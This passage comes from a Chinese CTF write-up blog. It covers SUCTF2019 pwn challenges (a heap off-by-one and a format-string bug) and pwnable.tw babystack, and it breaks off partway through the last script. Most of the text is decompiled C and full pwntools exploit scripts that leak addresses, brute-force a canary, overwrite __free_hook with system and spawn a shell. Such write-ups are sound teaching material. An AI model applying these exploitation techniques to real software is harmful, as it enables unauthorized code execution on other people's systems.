class="comment">#flag&#123;M4ybe_Saf3_SEH_1s_n0t_S4f3?&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="二手破电脑"><a href="#二手破电脑" class="headerlink" title="二手破电脑"></a>二手破电脑</h2><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>漏洞在写Name的时候的sprintf的off-by-one，构造堆块实在是太麻烦了，leak heap和leak libc花了我一天的时间。。最后是用Overlap chunk分配Large bin得到heap地址，自己做这种复杂一点的堆构造真的是太费劲了，思路不够清晰，做了很多无用功.</p>
<p>拿shell的方法是Overlap写一个pc的name_chunk为其本身，同时修改这个pc的size为fake size，从而Rename的时候地址任意写。</p>
<p><img src="/2020/09/03/SUCTF2019/3.jpg" alt="bug"></p>
<h3 id="exp-py-1"><a href="#exp-py-1" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'i386'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    p = process(<span class="string">'./pwn'</span>)</span><br><span class="line">    gadgets = [<span class="number">0x3ac5c</span>,<span class="number">0x3ac5e</span>,<span class="number">0x3ac62</span>,<span class="number">0x3ac69</span>,<span class="number">0x5fbc5</span>,<span class="number">0x5fbc6</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    gadgets = [<span class="number">0x3a80c</span>,<span class="number">0x3a80e</span>,<span class="number">0x3a812</span>,<span class="number">0x3a819</span>,<span class="number">0x5f065</span>,<span class="number">0x5f066</span>]</span><br><span class="line">    libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    p = remote(<span class="string">'47.111.59.243'</span>,<span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Purchase</span><span class="params">(size,name,price)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Name length: '</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'Name: '</span>)</span><br><span class="line">    p.send(name)</span><br><span class="line">    p.recvuntil(<span class="string">'Price: '</span>)</span><br><span class="line">    p.sendline(str(price))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Comment</span><span class="params">(index,comment,score)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">': '</span>)</span><br><span class="line">    p.sendline(comment)</span><br><span class="line">    p.recvuntil(<span class="string">'And its score: '</span>)</span><br><span class="line">    p.sendline(str(score))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Throw</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'index: '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Rename</span><span class="params">(index,new_content_1,new_content,isGetPower=<span class="string">'y'</span>,serial=<span class="string">'e4SyD1C!'</span>)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'index: '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    p.send(new_content_1)</span><br><span class="line">    p.recvuntil(<span class="string">'Wanna get more power?(y/n)'</span>)</span><br><span class="line">    p.sendline(isGetPower)</span><br><span class="line">    <span class="keyword">if</span> isGetPower == <span class="string">'y'</span>:</span><br><span class="line">        p.recvuntil(<span class="string">'Give me serial: '</span>)</span><br><span class="line">        p.send(serial)</span><br><span class="line">        raw_input()</span><br><span class="line">        p.send(<span class="string">'\n'</span>)</span><br><span class="line">        p.recvuntil(<span class="string">'Hey Pwner'</span>)</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        p.send(new_content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    Purchase(<span class="number">0x10</span>,<span class="string">'a\n'</span>,<span class="number">0</span>)<span class="comment">#0</span></span><br><span class="line">    Purchase(<span class="number">0x1fc</span>,<span class="string">'a\n'</span>,<span class="number">1</span>)<span class="comment">#1</span></span><br><span class="line">    Purchase(<span class="number">0x10</span>,<span class="string">'a\n'</span>,<span class="number">2</span>)<span class="comment">#2</span></span><br><span class="line">    Throw(<span class="number">2</span>)</span><br><span class="line">    Purchase(<span class="number">0x20</span>,<span class="string">'a\n'</span>,<span class="number">2</span>)<span class="comment">#2</span></span><br><span class="line">    <span class="comment">#Comment(2,'1',2)#2's</span></span><br><span class="line">    Purchase(<span class="number">0x30</span>,<span class="string">'a\n'</span>,<span class="number">3</span>)<span class="comment">#3</span></span><br><span class="line">    Purchase(<span class="number">0xc</span>,<span class="string">'a'</span>*<span class="number">0xc</span>,<span class="number">4</span>)<span class="comment">#4</span></span><br><span class="line">    Throw(<span class="number">0</span>)</span><br><span class="line">    Purchase(<span class="number">0x1fc</span>,<span class="string">'a\n'</span>,<span class="number">0</span>)<span class="comment">#0</span></span><br><span class="line">    Purchase(<span class="number">0x28</span>,<span class="string">'a\n'</span>,<span class="number">2</span>)<span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">    Throw(<span class="number">4</span>)<span class="comment">#1</span></span><br><span class="line">    Purchase(<span class="number">0xc</span>,<span class="string">'a'</span>*<span class="number">0x8</span>+p32(<span class="number">0x2b8</span>),<span class="number">4</span>)<span class="comment">#4</span></span><br><span class="line">    Throw(<span class="number">1</span>)<span class="comment">#free a unsorted</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Throw(<span class="number">0</span>)<span class="comment">#free another</span></span><br><span class="line">    <span class="comment">#leak heap</span></span><br><span class="line">    Purchase(<span class="number">0x38</span>+<span class="number">0x10</span><span class="number">-8</span>,<span class="string">'c\n'</span>,<span class="number">0</span>)<span class="comment">#0</span></span><br><span class="line">    Purchase(<span class="number">0x1e8</span>,<span class="string">'d\n'</span>,<span class="number">0</span>)<span class="comment">#1</span></span><br><span class="line">    Purchase(<span class="number">0x1f8</span>,<span class="string">'e\n'</span>,<span class="number">1</span>)<span class="comment">#6</span></span><br><span class="line">    <span class="comment">#comment 3</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Comment on '</span>)</span><br><span class="line">    heap_base = u32(p.recv(<span class="number">4</span>)) - <span class="number">0x2c8</span></span><br><span class="line">    log.success(<span class="string">'heap base =&gt; '</span> + hex(heap_base))</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">': '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'And its score: '</span>)</span><br><span class="line">    p.sendline(str(<span class="number">3</span>))</span><br><span class="line">    <span class="comment">#off by one again</span></span><br><span class="line">    Purchase(<span class="number">0x10</span>,<span class="string">'a\n'</span>,<span class="number">7</span>)<span class="comment">#7</span></span><br><span class="line">    Throw(<span class="number">6</span>)</span><br><span class="line">    Throw(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Purchase(<span class="number">0x1f8</span>,<span class="string">'a\n'</span>,<span class="number">6</span>)<span class="comment">#6</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Throw(<span class="number">1</span>)</span><br><span class="line">    Throw(<span class="number">6</span>)</span><br><span class="line">    Purchase(<span class="number">0x1e0</span>,<span class="string">'e\n'</span>,<span class="number">1</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Comment on '</span>)</span><br><span class="line">    libc_offset = <span class="number">0x1b2780</span></span><br><span class="line">    libc_base = u32(p.recv(<span class="number">4</span>)) - <span class="number">0x30</span> - libc_offset</span><br><span class="line">    log.success(<span class="string">'libc base =&gt; '</span> + hex(libc_base))</span><br><span class="line">    free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">    log.success(<span class="string">'free hook addr =&gt; '</span> + hex(free_hook))</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    log.success(<span class="string">'system addr =&gt; '</span> + hex(system_addr))</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">': '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'And its score: '</span>)</span><br><span class="line">    p.sendline(str(<span class="number">3</span>))</span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line"></span><br><span class="line">    Throw(<span class="number">1</span>)</span><br><span class="line">    Throw(<span class="number">0</span>)</span><br><span class="line">    Throw(<span class="number">4</span>)</span><br><span class="line">    Throw(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    Purchase(<span class="number">0x1a0</span>,<span class="string">'/bin/sh\n'</span>,<span class="number">0</span>)</span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x50</span>+p32(<span class="number">0x200</span>)+p32(<span class="number">0x29</span>)+p32(heap_base+<span class="number">0x280</span>)*<span class="number">2</span>+<span class="string">'a'</span>*<span class="number">0x18</span>+p32(<span class="number">0</span>)+p32(<span class="number">0x29</span>) <span class="comment">#set fake size=0x28</span></span><br><span class="line"></span><br><span class="line">    Purchase(<span class="number">0x80</span>,payload+<span class="string">'\n'</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    Purchase(<span class="number">0x30</span>,p32(<span class="number">0x270</span>)+p32(<span class="number">0x30</span>)+<span class="string">'\n'</span>,<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Rename(<span class="number">2</span>,p32(free_hook)*<span class="number">2</span>,p32(system_addr)+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">'PWNer say goobye gently'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h2 id="playfmt"><a href="#playfmt" class="headerlink" title="playfmt"></a>playfmt</h2><h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>简单的bss格式化字符串，flag在堆里，直接泄露即可</p>
<h3 id="exp-py-2"><a href="#exp-py-2" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'i386'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./playfmt'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    p = process(<span class="string">'./playfmt'</span>)</span><br><span class="line">    gadgets = [<span class="number">0x3ac5c</span>,<span class="number">0x3ac5e</span>,<span class="number">0x3ac62</span>,<span class="number">0x3ac69</span>,<span class="number">0x5fbc5</span>,<span class="number">0x5fbc6</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    gadgets = [<span class="number">0x3a80c</span>,<span class="number">0x3a80e</span>,<span class="number">0x3a812</span>,<span class="number">0x3a819</span>,<span class="number">0x5f065</span>,<span class="number">0x5f066</span>]</span><br><span class="line">    libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    p = remote(<span class="string">'120.78.192.35'</span>,<span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    buf_addr = <span class="number">0x0804b040</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#leak stack</span></span><br><span class="line">    p.recvuntil(<span class="string">'=====================\n'</span>)</span><br><span class="line">    heap_offset = <span class="number">0x4a28</span></span><br><span class="line">    p.sendline(<span class="string">"%18$p"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">    heap_base = int(p.recvline().strip(<span class="string">'\n'</span>),<span class="number">16</span>) - heap_offset</span><br><span class="line">    log.success(<span class="string">'heap base =&gt; '</span> + hex(heap_base))</span><br><span class="line">    target_addr = heap_base+heap_offset<span class="number">-0x18</span></span><br><span class="line">    <span class="comment">#leak stack</span></span><br><span class="line">    p.sendline(<span class="string">"%6$p"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">    stack_addr = int(p.recvline().strip(<span class="string">'\n'</span>),<span class="number">16</span>)</span><br><span class="line">    log.success(<span class="string">"stack addr =&gt; "</span> + hex(stack_addr))</span><br><span class="line">    target_stack_addr = stack_addr + <span class="number">0x10</span></span><br><span class="line">    <span class="comment">#leak flag</span></span><br><span class="line">    <span class="comment">#write addr</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">"%"</span>+str(target_stack_addr &amp; <span class="number">0xffff</span>)+<span class="string">"c"</span>+<span class="string">"%6$hn"</span></span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    <span class="keyword">print</span> p.recvline()</span><br><span class="line">    <span class="comment">#write var</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#gdb.attach(p,'b* 0x0804889f')</span></span><br><span class="line">    time.sleep(<span class="number">0.2</span>)</span><br><span class="line">    payload = <span class="string">"%"</span>+str(<span class="number">0x10</span>)+<span class="string">"c"</span>+<span class="string">"%14$hhn"</span></span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    <span class="keyword">print</span> p.recvline()</span><br><span class="line">    <span class="comment">#leak flag</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">"%18$s"</span></span><br><span class="line">    time.sleep(<span class="number">0.2</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    <span class="keyword">print</span> p.recvline()</span><br><span class="line">    <span class="comment">#raw_input()</span></span><br><span class="line">    p.sendline(<span class="string">'%18$s'</span>)</span><br><span class="line">    p.sendline(<span class="string">'quit'</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>SUCTF2019</category>
      </categories>
  </entry>
  <entry>
    <title>pwnable.tw-&gt;babystack</title>
    <url>/2020/09/03/babystack/</url>
    <content><![CDATA[<h1 id="pwnable-tw-gt-babystack"><a href="#pwnable-tw-gt-babystack" class="headerlink" title="pwnable.tw-&gt;babystack"></a>pwnable.tw-&gt;babystack</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>重新开始刷pwnable.tw，发现一年下来自己好像并没有什么长进。。做这里的题依然是举步维艰，记录一下这道折腾了三天的题QAQ。</p>
<h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><p>程序只有Login和Magic两个功能，只有Login过了check才能将0x202014置为1，进而可以使用Magic功能。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD *v3; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// [rsp+0h] [rbp-60h]</span></span><br><span class="line">  __int64 buf; <span class="comment">// [rsp+40h] [rbp-20h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+48h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> choice; <span class="comment">// [rsp+50h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  Init();</span><br><span class="line">  dword_202018[<span class="number">0</span>] = open(<span class="string">"/dev/urandom"</span>, <span class="number">0</span>);</span><br><span class="line">  read(dword_202018[<span class="number">0</span>], &amp;buf, <span class="number">0x10</span>uLL);</span><br><span class="line">  v3 = qword_202020;</span><br><span class="line">  v4 = v8;</span><br><span class="line">  *(_QWORD *)qword_202020 = buf;</span><br><span class="line">  v3[<span class="number">1</span>] = v4;                                   <span class="comment">// ？</span></span><br><span class="line">  close(dword_202018[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">"&gt;&gt; "</span>, <span class="number">3u</span>LL);</span><br><span class="line">    _read_chk(<span class="number">0L</span>L, &amp;choice, <span class="number">0x10</span>LL, <span class="number">0x10</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( choice == <span class="string">'2'</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( choice == <span class="string">'3'</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( unk_202014 )</span><br><span class="line">        magic(&amp;v6);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Invalid choice"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( choice == <span class="string">'1'</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( unk_202014 )</span><br><span class="line">        unk_202014 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        Login((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;buf);              <span class="comment">// set unk_202014 = 1</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Invalid choice"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !unk_202014 )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">memcmp</span>(&amp;buf, qword_202020, <span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Login需要跟随机数比较，可以输入’\x00’+*绕过strncmp，进而使用Magic函数，但是后面发现这样绕不过最终的memcmp检查。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">Login</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> pwd_len; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-80h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your passowrd :"</span>);</span><br><span class="line">  get_input(&amp;s, <span class="number">0x7F</span>u);</span><br><span class="line">  pwd_len = <span class="built_in">strlen</span>(&amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(&amp;s, buf, pwd_len) )              <span class="comment">// pwn_len == 0 ??</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Failed !"</span>);</span><br><span class="line">  unk_202014 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Login Success !"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>magic函数可以strcpy，漏洞基本就在这里了</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">magic</span><span class="params">(<span class="keyword">char</span> *des)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> src; <span class="comment">// [rsp+10h] [rbp-80h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Copy :"</span>);</span><br><span class="line">  get_input(&amp;src, <span class="number">0x3F</span>u);</span><br><span class="line">  <span class="built_in">strcpy</span>(des, &amp;src);                            <span class="comment">// 后面的也拷贝进去</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"It is magic copy !"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>刚才的magic试过之后发现可以溢出rbp-rbp+0x1f，但是因为最后的memcmp检查会和mmap的地址里的随机数对比，我们需要得到最开始的0x10大小的canary。这里的方法就是刚刚不久用过的爆破，因为strncmp是按size长度比较的，我们可以以’\x00’为分割，逐字节爆破，同样地，观察之后可以发现Login里的比较用的是栈里的数据，后面跟着的就是stack有关的地址和程序相关地址，因此使用相同的方法爆破出这两个地址，最终使用gadgets调用get_input读取更大输入，泄露libc并获取shell。</p>
<p>这里卡了我很长时间的一点是截断，strcpy需要调用多次且下一次要清空高字节的非零字符，方能strcpy写入数据。</p>
<p>还有输入choice的地方输入’1’*8和’1’是一样的，这个在栈地址对应canary后面，在爆破code base的时候需要输入8个1来填充。</p>
<h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'info'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./babystack'</span>)</span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    p = process(<span class="string">'./babystack'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc_64.so.6'</span>)</span><br><span class="line">    p = remote(<span class="string">'chall.pwnable.tw'</span>,<span class="number">10205</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Login</span><span class="params">(passwd,flag=<span class="number">1</span>)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.send(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Your passowrd :"</span>)</span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        p.send(passwd+<span class="string">'\x00'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.send(passwd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Login1</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.send(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Login8</span><span class="params">(passwd)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.send(<span class="string">'1'</span>*<span class="number">0x10</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Your passowrd :"</span>)</span><br><span class="line">    p.send(passwd+<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exit</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.send(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MagicCopy</span><span class="params">(content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Copy :"</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line">leave_ret_addr = <span class="number">0xd0d</span></span><br><span class="line">pop_rdi = <span class="number">0x10c3</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x10c1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#leak canary</span></span><br><span class="line">    try_lis = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">0x100</span>):</span><br><span class="line">        <span class="keyword">if</span> i != <span class="number">0xa</span>:</span><br><span class="line">            try_lis.append(p8(i))</span><br><span class="line">    <span class="comment">#boom</span></span><br><span class="line"></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x10</span>):</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> try_lis:</span><br><span class="line">            Login(res+item)</span><br><span class="line">            judge = p.recvline()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"Failed"</span> <span class="keyword">in</span> judge:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment">#raw_input()</span></span><br><span class="line">                res += item</span><br><span class="line">                Login1()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="comment">#for item in list(res):</span></span><br><span class="line">    canary = res</span><br><span class="line">    <span class="comment">#leak stack addr</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> try_lis:</span><br><span class="line">            Login(res+item)</span><br><span class="line">            judge = p.recvline()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"Failed"</span> <span class="keyword">in</span> judge:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                res += item</span><br><span class="line">                Login1()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="comment">#for item in list(res):</span></span><br><span class="line">    stack_addr = u64(res[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    ebp_addr = stack_addr - <span class="number">0xe1</span></span><br><span class="line">    log.success(<span class="string">"ebp addr =&gt; "</span> + hex(ebp_addr))</span><br><span class="line">    <span class="comment">#leak code base</span></span><br><span class="line">    res = res[<span class="number">0</span>:<span class="number">0x10</span>]+<span class="string">'1'</span>*<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x6</span>):</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> try_lis:</span><br><span class="line">            Login8(res+item)</span><br><span class="line">            judge = p.recvline()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"Failed"</span> <span class="keyword">in</span> judge:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span 